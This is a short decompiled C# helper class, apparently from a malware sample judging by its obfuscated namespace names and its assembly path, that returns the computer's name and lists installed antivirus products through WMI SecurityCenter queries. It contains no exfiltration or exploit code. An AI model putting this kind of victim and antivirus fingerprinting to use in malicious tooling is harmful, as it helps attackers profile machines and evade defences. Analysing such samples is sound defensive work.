// Decompiled with JetBrains decompiler
// Type: VERMELHO265MONARCA.Core.Helper.SystemHelper
// Assembly: madre, Version=1.1.2.3, Culture=neutral, PublicKeyToken=null
// MVID: E3E81F5F-5E79-4C7B-AA1D-713B5D376685
// Assembly location: C:\Users\Marcos Abreu\Documents\XPCTRA\idfptray.exe

using System;
using System.Management;

namespace VERMELHO265MONARCA.Core.Helper
{
  public static class SystemHelper
  {
    public static string GetPcName()
    {
      return Environment.MachineName;
    }

    public static string GetAntivirus()
    {
      try
      {
        string input = string.Empty;
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(PlatformHelper.VistaOrHigher ? "root\\SecurityCenter2" : "root\\SecurityCenter", "SELECT * FROM AntivirusProduct"))
        {
          foreach (ManagementObject managementObject in managementObjectSearcher.Get())
            input = input + managementObject["displayName"].ToString() + "; ";
        }
        string str = DEFEITUOSO43DESORDEM.RemoveEnd(input);
        return !string.IsNullOrEmpty(str) ? str : "N/A";
      }
      catch
      {
        return "Unknown";
      }
    }
  }
}
